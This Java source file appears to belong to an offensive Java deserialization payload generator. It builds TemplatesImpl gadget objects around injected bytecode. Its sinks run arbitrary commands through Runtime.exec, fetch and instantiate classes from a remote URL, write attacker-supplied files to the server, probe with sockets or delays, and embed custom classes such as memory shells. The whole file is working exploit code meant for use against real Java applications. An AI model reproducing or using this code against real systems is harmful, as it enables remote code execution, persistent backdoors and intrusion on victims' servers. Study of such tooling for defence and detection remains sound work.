package com.ppp.sinks;

import com.ppp.JavaClassBuilder;
import com.ppp.JavaClassHelper;
import com.ppp.Printer;
import com.ppp.middleware.builder.JavaClassModifier;
import com.ppp.sinks.annotation.EnchantType;
import com.ppp.sinks.annotation.Sink;
import com.ppp.utils.ClassFiles;
import com.ppp.utils.Gadgets;
import com.ppp.utils.Reflections;
import com.ppp.utils.RemoteLoadD;
import com.ppp.utils.maker.Encoder;
import com.ppp.utils.maker.JavaClassUtils;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.*;

import java.io.FileInputStream;

/**
 * @author Whoopsunix
 */
@Sink({Sink.TemplatesImpl})
public class TemplatesImpl {
    /**
     * 命令执行
     *
     * @param sinksHelper
     * @return
     * @throws Exception
     */
    @EnchantType({EnchantType.RUNTIME, EnchantType.DEFAULT})
    public Object runtime(SinksHelper sinksHelper) throws Exception {
        String className = "RuntimeD";

        String command = sinksHelper.getCommand();

        ClassPool pool = ClassPool.getDefault();

        CtClass ctClass = pool.makeClass(className);
        CtConstructor ctConstructor = new CtConstructor(new CtClass[]{}, ctClass);
        ctConstructor.setBody("{Runtime.getRuntime().exec(\"" + command + "\");}");
        ctClass.addConstructor(ctConstructor);

        // 设置 serialVersionUID
        JavaClassUtils.fieldChangeIfExist(ctClass, "serialVersionUID", "private static final long serialVersionUID = 8207363842866235160L;");
        ctClass.defrost();
        ctClass.addField(CtField.make("private static final long SerialVersionUIDDemo = 8207363842866235160L;", ctClass));

        // CtClass 增强
        byte[] bytes = JavaClassModifier.ctClassBuilderExt(ctClass, sinksHelper.getJavaClassHelper());

        return createTemplatesImpl(bytes);
    }


    /**
     * 线程延时
     *
     * @param sinksHelper
     * @return
     * @throws Exception
     */
    @EnchantType({EnchantType.Delay})
    public Object delay(SinksHelper sinksHelper) throws Exception {
        String className = "DelayD";

        Long sleepTime = sinksHelper.getSleepTime();
        String sleep = sinksHelper.getSleep();

        String code;
        ClassPool pool = ClassPool.getDefault();
        if (sleep != null && sleep.equalsIgnoreCase("timeunit")) {
            sleepTime *= 1000L;
            code = "java.lang.Thread.sleep((long)" + sleepTime + ");";
        } else {
            code = "java.util.concurrent.TimeUnit.SECONDS.sleep((long)" + sleepTime + ");";
        }
        CtClass ctClass = pool.makeClass(className);
        CtConstructor ctConstructor = new CtConstructor(new CtClass[]{}, ctClass);
        ctConstructor.setBody(code);
        ctClass.addConstructor(ctConstructor);


        // CtClass 增强
        byte[] bytes = JavaClassModifier.ctClassBuilderExt(ctClass, sinksHelper.getJavaClassHelper());

        return createTemplatesImpl(bytes);
    }

    /**
     * Socket 探测
     *
     * @param sinksHelper
     * @return
     * @throws Exception
     */
    @EnchantType({EnchantType.Socket})
    public Object socket(SinksHelper sinksHelper) throws Exception {
        String className = "SocketD";

        String thost = sinksHelper.getHost();

        String[] hostSplit = thost.split("[:]");
        String host = hostSplit[0];
        int port = 80;
        if (hostSplit.length == 2)
            port = Integer.parseInt(hostSplit[1]);

        ClassPool pool = ClassPool.getDefault();
        CtClass ctClass = pool.makeClass(className);
        CtConstructor ctConstructor = new CtConstructor(new CtClass[]{}, ctClass);
        ctConstructor.setBody(String.format("new java.net.Socket(\"%s\", %d);", host, port));
        ctClass.addConstructor(ctConstructor);

        // CtClass 增强
        byte[] bytes = JavaClassModifier.ctClassBuilderExt(ctClass, sinksHelper.getJavaClassHelper());

        return createTemplatesImpl(bytes);
    }

    /**
     * 远程类加载
     *
     * @param sinksHelper
     * @return
     * @throws Exception
     */
    @EnchantType({EnchantType.RemoteLoad})
    public Object remoteLoad(SinksHelper sinksHelper) throws Exception {
        String className = "RemoteLoadD";

        String url = sinksHelper.getUrl();
        String remoteClassName = sinksHelper.getRemoteClassName();
        Object constructor = sinksHelper.getConstructor();


        ClassPool pool = ClassPool.getDefault();
        CtClass ctClass = null;

        if (constructor != null) {
            // 转为 Integer
            try {
                constructor = Integer.parseInt(constructor.toString());
            } catch (Exception e) {
            }
            Class constructorType = constructor.getClass();

            ctClass = pool.get(RemoteLoadD.class.getName());
            JavaClassUtils.fieldChangeIfExist(ctClass, "url", String.format("private static String url = \"%s\";", url));
            JavaClassUtils.fieldChangeIfExist(ctClass, "className", String.format("private static String className = \"%s\";", remoteClassName));

            if (constructor instanceof Integer) {
                JavaClassUtils.fieldChangeIfExist(ctClass, "param", String.format("private static Object param = new Integer(%s);", constructor));
            } else if (constructor instanceof String) {
                JavaClassUtils.fieldChangeIfExist(ctClass, "param", String.format("private static Object param = \"%s\";", constructor));
            }

        } else {
            ctClass = pool.makeClass(className);
            CtConstructor ctConstructor = new CtConstructor(new CtClass[]{}, ctClass);
            String code = String.format("{java.net.URL url = new java.net.URL(\"%s\");\n" +
                    "        java.net.URLClassLoader classLoader = new java.net.URLClassLoader(new java.net.URL[]{url});\n" +
                    "        Class loadedClass = classLoader.loadClass(\"%s\");\n" +
                    "        Object object = loadedClass.getConstructor(null).newInstance(null);}", url, remoteClassName);
            ctConstructor.setBody(code);
            ctClass.addConstructor(ctConstructor);
        }


        // CtClass 增强
        byte[] bytes = JavaClassModifier.ctClassBuilderExt(ctClass, sinksHelper.getJavaClassHelper());

        return createTemplatesImpl(bytes);
    }

    /**
     * 文件写入
     *
     * @param sinksHelper
     * @return
     * @throws Exception
     */
    @EnchantType({EnchantType.FileWrite})
    public Object fileWrite(SinksHelper sinksHelper) throws Exception {
        String className = "FileWriteD";

        String serverFilePath = sinksHelper.getServerFilePath();
        String localFilePath = sinksHelper.getLocalFilePath();
        String fileContent = sinksHelper.getFileContent();

        byte[] contentBytes = new byte[]{};

        if (localFilePath != null) {
            try {
                FileInputStream fileInputStream = new FileInputStream(localFilePath);
                contentBytes = new byte[fileInputStream.available()];
                fileInputStream.read(contentBytes);
                fileInputStream.close();
            } catch (Exception e) {
                Printer.error("File read error");
            }
        } else if (fileContent != null) {
            contentBytes = fileContent.getBytes();
        }

        String b64 = Encoder.base64encoder(contentBytes);


        ClassPool pool = ClassPool.getDefault();

        CtClass ctClass = pool.makeClass(className);
        CtConstructor ctConstructor = new CtConstructor(new CtClass[]{}, ctClass);
        ctConstructor.setBody(String.format("{        java.lang.String b = \"%s\";\n" +
                "        final byte[] bytes = new sun.misc.BASE64Decoder().decodeBuffer(b);\n" +
                "        java.io.FileOutputStream fileOutputStream = new java.io.FileOutputStream(\"%s\");\n" +
                "        fileOutputStream.write(bytes);\n" +
                "        fileOutputStream.close();}", b64, serverFilePath));
        ctClass.addConstructor(ctConstructor);

        // CtClass 增强
        byte[] bytes = JavaClassModifier.ctClassBuilderExt(ctClass, sinksHelper.getJavaClassHelper());

        return createTemplatesImpl(bytes);
    }


    /**
     * JavaClass 增强
     * MemShell、RceEcho
     *
     * @param sinksHelper
     * @return
     * @throws Exception
     */
    @EnchantType({EnchantType.JavaClass})
    public Object javaClass(SinksHelper sinksHelper) throws Exception {
        JavaClassHelper javaClassHelper = sinksHelper.getJavaClassHelper();

        byte[] classBytes = JavaClassBuilder.build(javaClassHelper);

        return createTemplatesImpl(classBytes);
    }


//    public static void ctClassScheduler(CtClass ctClass, SinksHelper sinksHelper) throws Exception{
//        // 是否继承 AbstractTranslet
//        extendsAbstractTranslet(ctClass, sinksHelper);
//
//        //
//    }
//
//    /**
//     * 是否继承 AbstractTranslet
//     *
//     * @param ctClass
//     * @param sinksHelper
//     * @throws Exception
//     */
//    public static void extendsAbstractTranslet(CtClass ctClass, SinksHelper sinksHelper) throws Exception {
//        if (!sinksHelper.isExtendsAbstractTranslet()) {
//            return;
//        }
//        ClassPool pool = ClassPool.getDefault();
//        pool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
//        CtClass superCtClass = pool.get(AbstractTranslet.class.getName());
//        ctClass.setSuperclass(superCtClass);
//    }


    public static Object createTemplatesImpl(final byte[] classBytes) throws Exception {
        if (Boolean.parseBoolean(System.getProperty("properXalan", "false"))) {
            return createTemplatesImpl(
                    classBytes,
                    Class.forName("org.apache.xalan.xsltc.trax.TemplatesImpl"),
                    Class.forName("org.apache.xalan.xsltc.runtime.AbstractTranslet"),
                    Class.forName("org.apache.xalan.xsltc.trax.TransformerFactoryImpl"));
        }

        return createTemplatesImpl(classBytes, com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.class, AbstractTranslet.class, TransformerFactoryImpl.class);
    }

    public static <T> T createTemplatesImpl(byte[] classBytes, Class<T> tplClass, Class<?> abstTranslet, Class<?> transFactory)
            throws Exception {
        final T templates = tplClass.newInstance();

        // inject class bytes into instance
        Reflections.setFieldValue(templates, "_bytecodes", new byte[][]{
                classBytes, ClassFiles.classAsBytes(Gadgets.PPP.class)
        });

        // required to make TemplatesImpl happy
        Reflections.setFieldValue(templates, "_name", "anyStr");
        // 满足条件 1. classCount也就是_bytecodes的数量大于1   2. _transletIndex >= 0  可去掉 AbstractTranslet
        Reflections.setFieldValue(templates, "_transletIndex", 0);
        Reflections.setFieldValue(templates, "_tfactory", transFactory.newInstance());
        return templates;
    }
}
